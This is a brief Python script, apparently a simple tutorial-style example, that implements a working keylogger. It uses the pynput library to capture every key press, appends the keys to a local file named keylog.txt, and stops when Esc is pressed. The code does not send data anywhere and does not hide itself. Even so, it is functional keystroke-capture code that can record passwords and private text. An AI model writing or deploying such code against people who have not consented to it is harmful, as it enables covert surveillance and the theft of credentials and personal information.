from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "keylog.txt"

# Function to write key presses to the log file
def write_to_log(key):
    # Open the log file in append mode
    with open(log_file, "a") as f:
        try:
            # Write the key to the log file
            f.write(str(key.char))
        except AttributeError:
            # If special key (e.g., Enter, Shift), write its name instead
            f.write(f"{key}\n")

# Function to handle key presses
def on_press(key):
    write_to_log(key)

# Function to handle key releases
def on_release(key):
    # Stop the listener when Esc key is pressed
    if key == Key.esc:
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Keep the listener running until it's stopped
    listener.join()
